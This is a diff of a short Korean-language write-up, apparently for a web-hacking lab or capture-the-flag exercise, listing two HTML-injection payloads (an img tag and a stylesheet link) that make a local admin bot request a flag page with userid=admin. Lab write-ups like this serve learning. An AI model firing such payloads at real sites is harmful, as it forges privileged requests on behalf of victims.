@@ -21,5 +21,5 @@ Exploit)
 1. /admin/notice_flag 페이지를 방문하도록 해야함
 2. userid 파라미터가 admin인지 검사하는 부분이 존재하기 때문에 해당 문자열을 포함
 
-   => 1) http://127.0.0.1:8000/vuln?param=<img src = "/admin/notice_flag?userid=admin">
+   => 1) http://127.0.0.1:8000/vuln?param=<img src="/admin/notice_flag?userid=admin">
       2) http://127.0.0.1:8000/vuln?param=<link rel="stylesheet" href="/admin/notice_flag?userid=admin">
